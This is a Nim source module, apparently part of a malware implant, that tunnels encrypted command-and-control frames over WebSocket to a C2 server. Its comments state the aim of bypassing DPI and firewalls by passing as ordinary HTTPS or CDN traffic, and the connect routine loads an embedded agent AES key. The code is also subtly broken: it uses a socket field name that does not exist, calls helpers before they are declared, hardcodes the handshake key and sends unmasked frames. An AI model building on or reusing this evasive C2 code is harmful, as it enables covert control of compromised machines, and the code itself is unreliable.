## DCT transport - WebSocket tunneling for Domain C2.
## Routes C2 frames through WebSocket (wss://) to bypass DPI/firewalls.
## Appears as ordinary HTTPS traffic to CDN/Cloudflare.
import net, std/streams, std/strutils, std/asyncnet, std/asyncdispatch
import nativesockets, std/uri
import nimcrypto
import miau_codec, miau_config

const
  GCMNonceLen = 12
  GCMTagLen = 16
  MaxFrame = 8 * 1024 * 1024

type
  DctError* = object of CatchableError
  DctTransport* = ref object
    sock: AsyncSocket
    key: seq[byte]
    connected: bool
    host: string
    port: int
    path: string
    pinSha256: string

proc hexToBytes(s: string): seq[byte] =
  var i = 0
  while i + 1 < s.len:
    result.add(parseHexInt(s[i .. i + 1]).byte)
    i += 2

proc setKey*(t: DctTransport, hexKey: string) =
  t.key = hexToBytes(hexKey)

proc close*(t: DctTransport) =
  if t != nil and t.connected:
    try: t.sock.close()
    except: discard
    t.connected = false

proc encryptPayload(key: seq[byte], plain: string): seq[byte] =
  var nonce = newSeq[byte](GCMNonceLen)
  discard randomBytes[byte](nonce)
  var gcm: GCM[aes256]
  gcm.init(key, nonce, @[])
  var ct = newSeq[byte](plain.len)
  var tag = newSeq[byte](GCMTagLen)
  gcm.encrypt(plain.toBytes, ct, tag)
  result = nonce & ct & tag

proc decryptPayload(key: seq[byte], body: seq[byte]): string =
  if body.len < GCMNonceLen + GCMTagLen:
    raise newException(DctError, "frame too short")
  let nonce = body[0 ..< GCMNonceLen]
  let ctLen = body.len - GCMNonceLen - GCMTagLen
  let ct = body[GCMNonceLen ..< GCMNonceLen + ctLen]
  let tag = body[body.len - GCMTagLen .. ^1]
  var gcm: GCM[aes256]
  gcm.init(key, nonce, @[])
  var pt = newSeq[byte](ctLen)
  if not gcm.decrypt(ct, pt, tag):
    raise newException(DctError, "decrypt failed")
  result = pt.toStr

proc toBytes(s: string): seq[byte] =
  for c in s: result.add(byte(c))

proc toStr(b: openArray[byte]): string =
  result = newString(b.len)
  copyMem(result[0].addr, b[0].unsafeAddr, b.len)

proc wsHandshake(sock: AsyncSocket, host, path: string) =
  let request = "GET " & path & " HTTP/1.1\r\n" &
                "Host: " & host & "\r\n" &
                "Upgrade: websocket\r\n" &
                "Connection: Upgrade\r\n" &
                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" &
                "Sec-WebSocket-Version: 13\r\n" &
                "\r\n"
  sock.send(request)

proc wsRecvFrame(sock: AsyncSocket): seq[byte] =
  var header = newString(2)
  sock.recv(header, 2)
  if header.len < 2:
    raise newException(DctError, "ws recv failed")
  let opcode = ord(header[0]) and 0x0f
  let masked = (ord(header[1]) and 0x80) != 0
  var payloadLen = int(ord(header[1]) and 0x7f)
  if payloadLen == 126:
    var ext = newString(2)
    sock.recv(ext, 2)
    payloadLen = int(ord(ext[0]) shl 8) or ord(ext[1])
  elif payloadLen == 127:
    var ext = newString(8)
    sock.recv(ext, 8)
    for i in 0..7:
      payloadLen = (payloadLen shl 8) or ord(ext[i])
  var maskKey: string = ""
  if masked:
    maskKey = newString(4)
    sock.recv(maskKey, 4)
  var data = newString(payloadLen)
  sock.recv(data, payloadLen)
  if masked:
    for i in 0..<payloadLen:
      result.add(byte(ord(data[i]) xor ord(maskKey[i mod 4])))
  else:
    for c in data: result.add(byte(c))

proc wsSendFrame(sock: AsyncSocket, data: openArray[byte]) =
  var header = newString(2)
  header[0] = char(0x82)
  if data.len < 126:
    header[1] = char(data.len)
  elif data.len < 65536:
    header[1] = char(126)
    header.add(char((data.len shr 8) and 0xff))
    header.add(char(data.len and 0xff))
  else:
    header[1] = char(127)
    for i in countdown(7, 0):
      header.add(char((data.len shr (i * 8)) and 0xff))
  sock.send(header)
  sock.send(data)

proc sendEnvelope*(t: DctTransport, env: Envelope) =
  let plain = encodeEnvelope(env)
  let frame = encryptPayload(t.key, plain)
  wsSendFrame(t.socket, frame)

proc readEnvelope*(t: DctTransport): Envelope =
  let body = wsRecvFrame(t.socket)
  let plain = decryptPayload(t.key, body)
  result = decodeEnvelope(plain)

proc connect*(t: DctTransport, host: string, port: int,
              pin: string, token: string) =
  ## Connect via WebSocket tunnel (HTTPS proxy friendly).
  t.host = host
  t.port = port
  t.pinSha256 = pin
  t.key = hexToBytes(AgentAesKey)
  t.path = "/dct/" & token
  var sock = newAsyncSocket()
  sock.connect(host, Port(port))
  # Simple HTTP upgrade (in prod use proper HTTPS via proxy)
  wsHandshake(sock, host, t.path)
  t.socket = sock
  t.connected = true
